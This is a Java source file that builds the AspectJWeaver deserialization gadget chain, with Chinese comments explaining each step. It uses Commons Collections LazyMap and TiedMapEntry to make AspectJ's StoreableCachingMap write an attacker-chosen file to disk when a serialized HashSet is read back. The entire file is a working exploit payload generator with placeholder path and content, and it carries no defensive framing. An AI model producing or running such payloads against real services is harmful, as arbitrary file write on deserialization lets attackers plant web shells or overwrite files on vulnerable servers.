package AspectJWeaver;

/**
 * HashSet.readObject()
 *     HashMap.put()
 *         HashMap.hash()
 *             TiedMapEntry.hashCode()
 *                 TiedMapEntry.getValue()
 *                     LazyMap.get()
 *                         SimpleCache$StorableCachingMap.put()
 *                             SimpleCache$StorableCachingMap.writeToPath()
 */

import Tools.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Map;

public class AspectJWeaver {
    public static String fileName = "AspectJWeaver.bin";
    public static void main(String[] args) throws Exception {
        String fileName    = "123.txt";
        String filePath    = "d:/tmp/";
        String fileContent = "xxxxx";
        // 实例化  StoreableCachingMap 类
        Class<?> c = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(filePath, 10000);
        // 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
        Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));

        // 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
        Map lazyMap = LazyMap.decorate(map, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, fileName);

        HashSet hashSet = new HashSet();
        hashSet.add(entry);

        SerializeUtil.writeObjectToFile(hashSet,fileName);
        SerializeUtil.readFileObject(fileName);
    }

}
